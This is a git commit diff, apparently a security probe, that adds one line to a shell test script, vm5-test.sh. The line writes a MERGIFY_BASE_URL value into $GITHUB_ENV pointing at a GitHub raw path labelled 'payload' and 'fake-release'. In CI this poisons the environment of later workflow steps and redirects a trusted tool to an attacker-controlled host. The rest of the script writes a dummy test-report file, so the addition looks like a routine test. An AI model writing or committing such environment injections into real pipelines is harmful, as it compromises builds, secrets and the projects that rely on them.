f9f31035019294cec8b868cc6372123297dce656
livastic-vm5-secondary-20260911 <onecursora1+livastic+vm5+secondary+20260911@gmail.com>
2026-09-15 19:14:31 +0900

    test: simulate untrusted project test env persistence

--- vm5-test.sh
+++ vm5-test.sh
@@ -1,3 +1,4 @@
 #!/bin/sh
 set -eu
+echo 'MERGIFY_BASE_URL=https://raw.githubusercontent.com/livastic-vm5-mfy-260911-v8m2/vm5-b-org-create-probe-260914/vm5-base-url-payload-260915/vm5-fake-release' >> "$GITHUB_ENV"
 printf '<testsuite name="vm5"></testsuite>\n' > dummy.xml
